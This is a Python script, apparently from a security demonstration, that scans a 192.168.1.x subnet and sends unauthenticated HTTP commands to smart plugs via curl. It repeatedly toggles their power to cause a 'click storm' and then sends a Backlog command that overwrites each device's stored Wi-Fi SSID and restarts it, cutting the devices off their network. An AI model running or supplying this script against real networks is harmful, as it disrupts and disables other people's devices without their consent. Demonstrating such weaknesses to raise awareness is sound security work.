import os
import subprocess
import time
import threading
import numpy as np
import socket



def ping(ip, pingMaxTime):
    param = "-n"
    response = subprocess.call(["ping", param, "1", "-w", str(pingMaxTime), ip])
    return response == 0

def saveDeviceIfPresent(pingMaxTime, ping, devices, ip):
    if ping(ip, pingMaxTime):
        devices.append(ip)

def toggle(device, delay):
    # for s in song:
    os.system('cmd /c "curl http://' + device + '/cm?cmnd=Power%20TOGGLE"')
    # time.sleep(delay)
    print(" Time:", delay, "Device:", device[10:])
    return 
    
def formatSSID(device):
    # messages = ["Var1%20Thank%20you%20for%20attending%21", "Var2%20Your%20device%20is%20now%20reset.", "Var3%20--IEEE-CS", "Var", "Backlog%20SSID1%201%3B%20Restart%201"]
    messages = ["Backlog%20SSID1%201%3B%20Restart%201"]
    for m in messages:
        os.system('cmd /c "curl http://' + device + '/cm?cmnd=' + m + '"')
    return
    
def playSong(device, song):
    os.system('cmd /c "curl http://' + device + '/cm?cmnd='+song+'"')
    return 
    
   
default_gateway = "192.168.1.1"
pingMaxTime = 100
ips = ["192.168.1." + str(ip) for ip in range(256)]
hostname = socket.gethostbyname(socket.gethostname())
hostname = "192.168.1.103" #debug only because I currently have 2 NICs
print("make sure that the hostname \'"+hostname+"\' is from the same interface as the router.")
variable = ""
while variable != 'd':
    variable = input('enter \'d\' to search the domain for connected devices: ')
estimation = round((256/2))
devices = []
print("searching for connected devices. This will take about "+str(estimation)+" seconds...")

# iterative approach to pinging IP addresses
# for ip in ips:
    # saveDeviceIfPresent(pingMaxTime, ping, devices, ip)

# for testing
# devices.append(default_gateway) # for testing
devices.append("192.168.1.100") # for testing
devices.append("192.168.1.136") # for testing

# not worth implementing because of errors
# devices.remove(hostname) # remove host machine from list
# devices.remove(default_gateway) # remove default gateway from list

print()
print(str(len(devices))+" devices found:")
print(devices)
print()

variable = ""
print("this probably won't work well because of network latency..")
while variable != 's':
    variable = input('enter \'s\' to cause click storm: ')
# random switch thing
print("creating chaos.")

delay = 1
variable = ""


while True:
    variable = input('\n\nenter \'s\' to stop: ')
    for device in devices:
        toggle(device, delay)
    if variable == 's':
        break
      

        
        

# delay = 10 #milliseconds?[
# threads = [threading.Thread(target=toggle, args=(device, delay)) for device in devices]
# for t in threads:
    # t.start()
# for t in threads:
    # t.join()
   
# formatting stored wifi credentials of connected devices
variable = ""
while variable != 'f':
    variable = input('\n\nenter \'f\' to format all connected devices\' wifi credentials: ')
for device in devices:
    print("Sent Ad-Hoc Reset Command to " + device)
    formatSSID(device)